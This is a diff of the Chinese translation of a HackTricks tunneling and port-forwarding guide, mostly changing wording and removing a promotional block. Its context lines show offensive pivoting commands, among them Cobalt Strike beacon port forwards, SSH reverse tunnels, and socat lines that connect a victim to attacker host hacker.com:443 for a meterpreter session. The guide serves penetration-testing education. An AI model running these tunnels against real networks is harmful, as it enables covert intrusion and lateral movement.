@@ -9,21 +9,13 @@
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Nmap 提示
+## Nmap tip
 
 {% hint style="warning" %}
 **ICMP** 和 **SYN** 扫描无法通过 socks 代理进行隧道传输，因此我们必须 **禁用 ping 探测** (`-Pn`) 并指定 **TCP 扫描** (`-sT`) 以使其工作。
@@ -31,7 +23,7 @@
 
 ## **Bash**
 
-**主机 -> 跳转 -> 内部A -> 内部B**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -90,7 +82,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-您需要**在两个设备上具有root权限**（因为您将要创建新的接口），并且sshd配置必须允许root登录：\
+您需要**在两个设备上具有root权限**（因为您将创建新的接口），并且sshd配置必须允许root登录：\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -176,13 +168,13 @@ rportfwd stop [bind port]
 To note:
 
 - Beacon的反向端口转发旨在**将流量隧道到团队服务器，而不是在单个机器之间中继**。
-- 流量是**在Beacon的C2流量中隧道化**，包括P2P链接。
+- 流量在**Beacon的C2流量中隧道**，包括P2P链接。
 - **不需要管理员权限**来在高端口上创建反向端口转发。
 
 ### rPort2Port local
 
 {% hint style="warning" %}
-在这种情况下，**端口在beacon主机上打开**，而不是在团队服务器上，**流量发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
+在这种情况下，**端口在beacon主机中打开**，而不是在团队服务器中，**流量发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -268,7 +260,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-您可以通过在受害者的控制台中执行这一行来绕过**非认证代理**：
+您可以通过在受害者的控制台中执行这一行来绕过**非认证代理**，而不是最后一行：
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -325,18 +317,18 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的RDP访问权限**。\
+您需要拥有**系统的 RDP 访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用Windows的远程桌面服务功能中的`动态虚拟通道`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 的远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
-在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
+在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，方法如下：
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **受害者**，我们应该收到一个 **提示**，说明 **SocksOverRDP 插件已启用**，并且它将 **监听** 在 **127.0.0.1:1080**。
 
 通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
@@ -348,7 +340,7 @@ netstat -antb | findstr 1080
 ```
 现在您可以使用 [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**
 
-## 代理 Windows GUI 应用程序
+## 通过 Proxifier 代理 Windows GUI 应用程序
 
 您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
@@ -375,7 +367,7 @@ Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
 现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+你也可以使用一个连接到localhost:443的**meterpreter**，攻击者在2222端口监听。
 
 ## YARP
 
@@ -445,7 +437,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
+[**从这里下载**](https://github.com/utoni/ptunnel-ng.git).
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -495,7 +487,7 @@ chmod a+x ./ngrok
 ```
 #### 嗅探 HTTP 调用
 
-*对 XSS, SSRF, SSTI 等有用*
+*对 XSS、SSRF、SSTI 等有用*
 直接从 stdout 或在 HTTP 接口 [http://127.0.0.1:4040](http://127.0.0.1:4000)。
 
 #### 隧道内部 HTTP 服务
@@ -526,14 +518,6 @@ addr: file:///tmp/httpbin/
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
-
-**努力安全小组**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
 
 {% hint style="success" %}
 学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
